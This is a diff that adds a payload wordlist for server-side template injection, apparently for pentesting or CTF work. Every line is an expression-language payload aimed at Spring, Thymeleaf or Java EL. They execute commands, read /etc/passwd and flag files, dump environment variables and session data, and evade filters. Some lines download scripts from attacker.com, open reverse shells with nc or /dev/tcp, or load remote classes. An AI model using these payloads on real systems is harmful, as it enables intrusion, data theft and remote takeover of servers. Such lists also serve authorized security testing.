@@ -1,0 +1,164 @@
+${7*7}
+${7*'7'}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('ls -la')}
+${T(java.lang.Runtime).getRuntime().exec('uname -a')}
+${T(java.lang.Runtime).getRuntime().exec('pwd')}
+${T(java.lang.Runtime).getRuntime().exec('env')}
+${T(java.lang.Runtime).getRuntime().exec('cat flag.txt')}
+${T(java.lang.Runtime).getRuntime().exec('ps aux')}
+${T(java.lang.Runtime).getRuntime().exec('ifconfig')}
+${T(java.lang.Runtime).getRuntime().exec('netstat -an')}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','whoami'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat /etc/passwd'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id'})}
+${T(java.lang.String).getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+${T(java.lang.String).getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}
+${T(java.lang.System).getProperty('user.name')}
+${T(java.lang.System).getProperty('user.home')}
+${T(java.lang.System).getProperty('user.dir')}
+${T(java.lang.System).getProperty('os.name')}
+${T(java.lang.System).getProperty('os.version')}
+${T(java.lang.System).getProperty('os.arch')}
+${T(java.lang.System).getProperty('java.version')}
+${T(java.lang.System).getProperty('java.home')}
+${T(java.lang.System).getProperty('java.class.path')}
+${T(java.lang.System).getenv()}
+${T(java.lang.System).getenv('PATH')}
+${T(java.lang.System).getenv('HOME')}
+${T(java.lang.System).getenv('USER')}
+${T(java.lang.System).getenv('SHELL')}
+${T(java.lang.ProcessBuilder).start()}
+${new java.lang.ProcessBuilder('id').start()}
+${new java.lang.ProcessBuilder('whoami').start()}
+${new java.lang.ProcessBuilder('cat','/etc/passwd').start()}
+${new java.lang.ProcessBuilder('ls','-la').start()}
+${new java.lang.ProcessBuilder('uname','-a').start()}
+${new java.lang.ProcessBuilder('bash','-c','id').start()}
+${new java.lang.ProcessBuilder('sh','-c','id').start()}
+${new java.lang.ProcessBuilder('/bin/sh','-c','id').start()}
+${new java.lang.ProcessBuilder('/bin/bash','-c','id').start()}
+${new java.lang.ProcessBuilder(new String[]{'sh','-c','id'}).start()}
+${T(java.lang.Class).forName('java.lang.Runtime').getRuntime().exec('id')}
+${T(java.lang.Class).forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}
+${T(java.lang.Class).forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance('id').start()}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'}).getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'}).getInputStream())}
+${#strings.toString(T(java.lang.Runtime).getRuntime().exec('id'))}
+${#request.getSession().getServletContext().getContextPath()}
+${#servletContext.getServerInfo()}
+${#servletContext.getRealPath('/')}
+${#servletContext.getInitParameterNames()}
+${#httpServletRequest.getRequestURL()}
+${#httpServletRequest.getRequestURI()}
+${#httpServletRequest.getQueryString()}
+${#httpServletRequest.getRemoteAddr()}
+${#httpServletRequest.getRemoteHost()}
+${#httpServletRequest.getHeader('User-Agent')}
+${#httpServletRequest.getHeaderNames()}
+${#httpServletRequest.getCookies()}
+${#httpServletRequest.getSession()}
+${#httpSession.getId()}
+${#httpSession.getAttributeNames()}
+${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}
+${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('flag.txt'))}
+${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}
+${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('flag.txt'))}
+${T(java.nio.file.Files).lines(T(java.nio.file.Paths).get('/etc/passwd'))}
+${T(java.nio.file.Files).list(T(java.nio.file.Paths).get('/'))}
+${T(java.nio.file.Files).walk(T(java.nio.file.Paths).get('/'))}
+${T(java.io.File).new('/etc/passwd').exists()}
+${new java.io.File('/etc/passwd').exists()}
+${new java.io.File('/etc/passwd').canRead()}
+${new java.io.File('/').list()}
+${new java.io.File('.').list()}
+${new java.io.File('/').listFiles()}
+${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}
+${T(java.lang.Runtime).getRuntime().exec('wget http://attacker.com/shell.sh -O /tmp/shell.sh')}
+${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/shell.sh -o /tmp/shell.sh')}
+${T(java.lang.Runtime).getRuntime().exec('nc attacker.com 4444 -e /bin/bash')}
+${T(java.lang.Runtime).getRuntime().exec('/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1')}
+${T(javax.script.ScriptEngineManager).new().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec("id")')}
+${T(javax.script.ScriptEngineManager).new().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
+${T(javax.script.ScriptEngineManager).new().getEngineByName('nashorn').eval('java.lang.Runtime.getRuntime().exec("id")')}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('id')}
+${applicationScope}
+${requestScope}
+${sessionScope}
+${param}
+${#ctx}
+${#vars}
+${#locale}
+${#request}
+${#response}
+${#session}
+${#servletContext}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.System).getProperty('user.name')}
+*{new java.lang.ProcessBuilder('id').start()}
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+__${new java.lang.ProcessBuilder('id').start()}__::.x
+${T(java.lang.Runtime).getRuntime().exec('cat${IFS}/etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('cat$IFS/etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat</etc/passwd'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat<flag.txt'})}
+${T(java.lang.Class).forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder;x.command('id');x.start()")}
+${T(java.lang.Class).forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("java.lang.Runtime.getRuntime().exec('id')")}
+${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}
+${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}
+${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}
+${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'}).getInputStream(),T(java.nio.charset.Charset).defaultCharset())}
+${@beans}
+${@environment}
+${@systemProperties}
+${@systemEnvironment}
+${@applicationContext}
+${T(org.springframework.cglib.core.ReflectUtils).defineClass('Exploit',T(org.apache.commons.codec.binary.Base64).decodeBase64('yv66vg...'),new java.net.URLClassLoader(new java.net.URL[0])).newInstance()}
+${T(java.net.URLClassLoader).newInstance(T(java.net.URL).newInstance('http://attacker.com/')).loadClass('Exploit').newInstance()}
+${T(java.lang.Runtime).getRuntime().availableProcessors()}
+${T(java.lang.Runtime).getRuntime().freeMemory()}
+${T(java.lang.Runtime).getRuntime().totalMemory()}
+${T(java.lang.Runtime).getRuntime().maxMemory()}
+${T(java.lang.Thread).currentThread()}
+${T(java.lang.Thread).getAllStackTraces()}
+${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getName()}
+${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getInputArguments()}
+${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getSystemProperties()}
+${T(java.lang.Runtime).getRuntime().exec(T(org.apache.commons.lang3.StringUtils).join(new String[]{'sh','-c','id'},' '))}
+${T(java.beans.Beans).instantiate(null,'javax.script.ScriptEngineManager').getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec("id")')}
+${T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
+${T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.ProcessBuilder').getConstructor(T(String[]).class).newInstance(new String[]{'id'}).start()}
+${T(java.lang.Character).toString(106).concat(T(java.lang.Character).toString(97))}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\Z').next()}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next()}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\Z').next()}
+${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}
+${new java.util.Scanner(new java.io.File('flag.txt')).useDelimiter('\\Z').next()}
+${T(org.apache.el.lang.ELSupport).coerceToType('id',T(java.lang.String))}
+${T(java.net.InetAddress).getLocalHost()}
+${T(java.net.InetAddress).getLocalHost().getHostName()}
+${T(java.net.InetAddress).getLocalHost().getHostAddress()}
+${T(java.security.AccessController).doPrivileged(new java.security.PrivilegedAction(){@Override public Object run(){try{return T(java.lang.Runtime).getRuntime().exec('id');}catch(Exception e){return null;}}})}
+${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())).readLine()}
+${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())).lines().toArray()}
+${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()}
+${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).lines().toArray()}
+${new java.io.BufferedReader(new java.io.FileReader('flag.txt')).readLine()}
+${T(java.lang.Runtime).getRuntime().exec('calc')}
+${T(java.lang.Runtime).getRuntime().exec('cmd /c calc')}
+${T(java.lang.Runtime).getRuntime().exec('cmd /c dir')}
+${T(java.lang.Runtime).getRuntime().exec('powershell.exe')}
+${T(java.lang.Runtime).getRuntime().exec('cmd.exe /c whoami')}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'cmd','/c','whoami'})}
+${T(java.lang.Runtime).getRuntime().exec(new String[]{'powershell','-c','whoami'})}
+${T(java.util.Base64).getDecoder().decode('aWQ=')}
+${new java.lang.String(T(java.util.Base64).getDecoder().decode('aWQ='))}
